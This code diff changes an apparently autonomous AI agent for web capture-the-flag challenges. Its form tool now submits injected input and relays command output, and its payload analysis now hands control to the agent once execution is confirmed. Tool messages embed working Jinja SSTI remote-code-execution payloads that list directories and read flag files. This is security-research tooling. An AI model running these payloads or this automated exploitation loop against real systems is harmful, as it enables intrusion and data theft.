@@ -81,20 +81,93 @@ async def click_element(selector: str) -> str:
 
 
 @tool
-async def fill_input(selector: str, value: str) -> str:
-    """Fill an input field with a value.
+async def fill_input(selector: str, value: str, submit: bool = True) -> str:
+    """Fill an input field with a value and optionally submit.
 
     Use for text inputs, textareas, password fields, and other form fields.
+    By default, this will press Enter after filling to submit the form.
+
+    IMPORTANT: After submission, if the page changes and has no input elements,
+    this tool automatically navigates BACK so you can try another payload.
+    READ the response carefully - the output of your command is in there!
 
     Args:
         selector: CSS selector for the input element.
         value: The value to fill into the input.
+        submit: If True (default), press Enter after filling to submit.
 
     Returns:
-        Status message about fill result.
+        Status message and page response after submission.
     """
     browser = get_browser()
+    original_url = browser.get_current_url()
     result = await browser.fill(selector, value)
+
+    if submit:
+        # Press Enter to submit
+        await browser.press_key("Enter")
+
+        # Wait for response
+        await browser.page.wait_for_timeout(1500)
+        try:
+            await browser.page.wait_for_load_state("networkidle", timeout=5000)
+        except Exception:
+            pass  # Continue even if timeout
+
+        # Get the response
+        html = await browser.get_page_content()
+        url = browser.get_current_url()
+
+        # Check for flag in response
+        from ..utils.flag_detector import detect_flag
+        flag = detect_flag(html)
+
+        if flag:
+            return f"Filled and submitted. FLAG FOUND: {flag}\n\nPage URL: {url}"
+
+        # Strip HTML tags for cleaner output
+        import re
+        body_text = re.sub(r'<[^>]+>', ' ', html)
+        body_text = ' '.join(body_text.split())[:800]
+
+        # Check if page changed and has no input elements
+        page_changed = url != original_url
+        has_inputs = False
+        try:
+            elements = await extract_interactive_elements(browser.page)
+            input_elements = [e for e in elements if e.get('tag') in ['input', 'textarea']]
+            has_inputs = len(input_elements) > 0
+        except Exception:
+            pass
+
+        # If page changed and has no inputs, navigate back automatically
+        navigated_back = False
+        if page_changed and not has_inputs:
+            try:
+                await browser.go_back()
+                await browser.page.wait_for_timeout(500)
+                navigated_back = True
+            except Exception:
+                pass
+
+        response_parts = [
+            f"Filled and submitted.",
+            f"",
+            f"=== COMMAND OUTPUT (READ THIS!) ===",
+            f"{body_text}",
+            f"===================================",
+            f"",
+            f"Page URL after submit: {url}",
+        ]
+
+        if navigated_back:
+            response_parts.append(f"")
+            response_parts.append(f"Auto-navigated back to: {browser.get_current_url()}")
+            response_parts.append(f"")
+            response_parts.append(f"Analyze the output above and use fill_input with your next command.")
+
+        return "\n".join(response_parts)
+
     return result
 
 
@@ -492,14 +565,14 @@ def _analyze_payload_response(payload: str, payload_type: str, html: str, origin
             interesting = True
 
     elif payload_type == "ssti_explore":
-        # For exploration, we want to run ALL payloads to gather info
-        # Only stop (critical=True) if we actually find a flag
-        # Capture ALL useful info to help LLM craft the final payload
+        # STOP after first successful command execution - agent must craft own payloads
+        # This forces the agent to analyze the output and use fill_input for exploitation
 
-        # Directory listing output - extract full listing
+        # Directory listing output - extract full listing and STOP
         if re.search(r'total \d+|drwx|^-rw|lrwx', html):
-            findings.append("Directory listing detected!")
+            findings.append("COMMAND EXECUTION CONFIRMED - Directory listing detected!")
             interesting = True
+            critical = True  # STOP HERE - agent must take over with fill_input
             # Extract the directory listing (between template output markers)
             # Strip HTML and get clean output
             clean_html = re.sub(r'<[^>]+>', '\n', html)
@@ -511,14 +584,19 @@ def _analyze_payload_response(payload: str, payload_type: str, html: str, origin
                 flag_files = re.findall(r'[\w./-]*flag[\w./-]*', listing, re.IGNORECASE)
                 if flag_files:
                     findings.append(f"FLAG FILES FOUND: {', '.join(set(flag_files))}")
+                # Look for interesting directories to explore
+                interesting_dirs = re.findall(r'(challenge|app|home|flag|ctf|secret)', listing, re.IGNORECASE)
+                if interesting_dirs:
+                    findings.append(f"INTERESTING DIRECTORIES: {', '.join(set(interesting_dirs))}")
 
-        # Find command output - extract file paths
+        # Find command output - extract file paths and STOP
         if 'find' in payload.lower() or 'locate' in payload.lower():
             # Extract file paths from find output
             clean_html = re.sub(r'<[^>]+>', '\n', html)
             file_paths = re.findall(r'(/[\w./-]+)', clean_html)
             if file_paths:
                 interesting = True
+                critical = True  # STOP - agent should use fill_input to cat the files
                 # Filter for interesting paths
                 interesting_paths = [p for p in file_paths if 'flag' in p.lower() or '.txt' in p.lower()]
                 if interesting_paths:
@@ -558,23 +636,27 @@ def _analyze_payload_response(payload: str, payload_type: str, html: str, origin
             interesting = True
             # NOT critical - keep exploring
 
-        # Command output (id, whoami, pwd, etc.)
+        # Command output (id, whoami, pwd, etc.) - STOP and let agent take over
         if re.search(r'uid=\d+|root:|www-data|/bin/bash', html):
             findings.append("Command execution confirmed!")
             interesting = True
+            critical = True  # STOP - agent should use fill_input
 
-        # PWD output - capture current directory
+        # PWD output - capture current directory and STOP
         if 'pwd' in payload.lower():
             clean_html = re.sub(r'<[^>]+>', ' ', html)
             pwd_match = re.search(r'(/[\w/-]+)', clean_html)
             if pwd_match and not response_snippet:
                 findings.append(f"Current directory: {pwd_match.group(1)}")
                 response_snippet = pwd_match.group(1)
+                interesting = True
+                critical = True  # STOP - agent knows the working directory now
 
-        # Check if response changed significantly (command output likely)
-        if len(html) > len(original_html) + 50:
+        # Check if response changed significantly (command output likely) - STOP
+        if len(html) > len(original_html) + 100:  # Increased threshold
             findings.append(f"Response grew by {len(html) - len(original_html)} bytes - command executed!")
             interesting = True
+            critical = True  # STOP - command executed, agent should analyze and continue
 
     elif payload_type == "sqli":
         # Check for SQL errors
@@ -858,13 +940,23 @@ DO NOT call try_common_payloads again. Use fill_input with a custom payload NOW.
             # If critical finding, stop and report
             if analysis["critical"]:
                 results.append(f"\n{'='*60}")
-                results.append(f"VULNERABILITY CONFIRMED! DO NOT run detection payloads again!")
+                results.append(f"COMMAND EXECUTION CONFIRMED! YOU must now craft your own payloads!")
                 results.append(f"{'='*60}")
                 if payload_type == "ssti":
                     results.append(f"\nNEXT ACTION: Use fill_input with this SSTI RCE payload:")
-                    results.append(f"  fill_input('#announce', \"{{{{lipsum.__globals__['os'].popen('ls -la /').read()}}}}\")")
+                    results.append(f"  fill_input('{input_selector}', \"{{{{lipsum.__globals__['os'].popen('ls -la /').read()}}}}\")")
                     results.append(f"\nThis will list files at root. Then based on what you see, use fill_input")
                     results.append(f"to cat the flag file (e.g., cat /flag.txt)")
+                elif payload_type == "ssti_explore":
+                    results.append(f"\n*** IMPORTANT: Analyze the output above! ***")
+                    results.append(f"\nYou saw a directory listing. Now YOU must:")
+                    results.append(f"1. Look at the directories/files shown above")
+                    results.append(f"2. Identify interesting directories (challenge, app, flag, etc.)")
+                    results.append(f"3. Use fill_input to explore those directories:")
+                    results.append(f"   fill_input('{input_selector}', \"{{{{lipsum.__globals__['os'].popen('ls -la /challenge').read()}}}}\")")
+                    results.append(f"4. When you find the flag file, read it:")
+                    results.append(f"   fill_input('{input_selector}', \"{{{{lipsum.__globals__['os'].popen('cat /challenge/flag').read()}}}}\")")
+                    results.append(f"\nDO NOT use try_common_payloads again! Use fill_input with YOUR OWN commands!")
                 elif payload_type == "sqli":
                     results.append(f"\nNEXT ACTION: Use fill_input with UNION SELECT to extract data")
                 elif payload_type == "cmdi":
